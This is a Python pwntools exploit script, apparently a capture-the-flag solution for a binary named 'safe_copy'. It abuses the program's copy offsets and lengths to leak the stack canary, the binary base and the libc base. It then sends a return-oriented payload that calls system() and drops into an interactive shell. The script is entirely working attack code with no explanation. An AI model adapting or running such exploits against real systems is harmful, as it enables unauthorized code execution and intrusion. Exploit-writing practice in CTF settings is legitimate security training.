from pwn import *

io = process("./safe_copy_patched")
#io = remote("xxx.xx.xxx.xx", xxxx)
elf = ELF("./safe_copy")
libc = ELF("./libc-2.23.so")

def copy(content, start, max_len, boundary, length):
    io.sendafter(b"Your input: ", content)
    io.sendlineafter(b"Start offset: ", str(start).encode())
    io.sendlineafter(b"Max copy len: ", str(max_len).encode())
    io.sendlineafter(b"Copy boundary: ", str(boundary).encode())
    io.sendlineafter(b"Copy len: ", str(length).encode())

copy(b'!' * 0xb, 0xfe, 0x7fffffff, 0x100, 0xb)
io.recvuntil(b'!' * 0xa)
canary = u64(io.recv(8)) - ord('!')
print("canary = " + hex(canary))

copy(b'@' * 0x2a, 0xfe, 0x7fffffff, 0x100, 0x2a)
io.recvuntil(b'@' * 0x2a)
elf.address = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x13f0
print("elf.address = " + hex(elf.address))

copy(b'&' * 0x3a, 0xfe, 0x7fffffff, 0x100, 0x3a)
io.recvuntil(b'&' * 0x3a)
libc.address = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x20840
print("libc.address = " + hex(libc.address))

p_rdi = elf.address + 0x1763
rop_payload = b'^' * 0xa + p64(canary) + p64(0xdeadbeef) * 5 + p64(p_rdi) + p64(libc.address + 0x18ce57) + p64(libc.symbols["system"])
copy(rop_payload, 0xfe, 0x7fffffff, 0x100, len(rop_payload))

copy(b"exit\n\x00", 0, 6, 10, 6)

io.interactive()
